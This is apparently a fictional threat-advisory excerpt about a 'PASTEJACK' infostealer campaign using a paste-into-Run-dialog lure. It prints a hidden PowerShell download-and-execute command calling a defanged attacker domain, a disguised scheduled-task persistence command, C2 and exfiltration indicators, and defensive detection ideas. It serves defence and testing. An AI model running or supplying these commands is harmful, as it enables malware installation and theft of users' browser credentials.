# Threat advisory excerpt (fictional, for testing): "PASTEJACK" infostealer campaign

Observed 2026-10-20 across three European customers. Initial access is a ClickFix-style lure: the
victim is told to "verify they are human" by pasting a command into the Windows Run dialog. The pasted
command observed in all three cases:

    conhost.exe --headless powershell.exe -w hidden -c "irm hxxps://cdn-updates-check[.]com/v.txt | iex"

The downloaded script writes the payload to %APPDATA%\msbuild\upd.exe (SHA256
9f2c1e0a7b5d4c3e8a1f6b2d0c9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e, fictional) and establishes
persistence with a scheduled task:

    schtasks /create /sc ONLOGON /tn "OneDrive Sync Health" /tr "C:\Users\<user>\AppData\Roaming\msbuild\upd.exe" /f

Command and control uses HTTPS to cdn-updates-check[.]com and telemetry-sync-cloud[.]net
(resolving to 203.0.113.45). Stolen browser credentials are exfiltrated by HTTP POST to
/api/upload on the same hosts with the user agent "Mozilla/5.0 (compatible; UpdateChecker/1.0)".

Detection opportunities called out by the authors:
1. conhost.exe launched with --headless spawning powershell.exe with a download cradle.
2. Scheduled task creation whose action points into a user's AppData\Roaming path.
3. Outbound connections from a process in AppData\Roaming to the listed domains/IP.
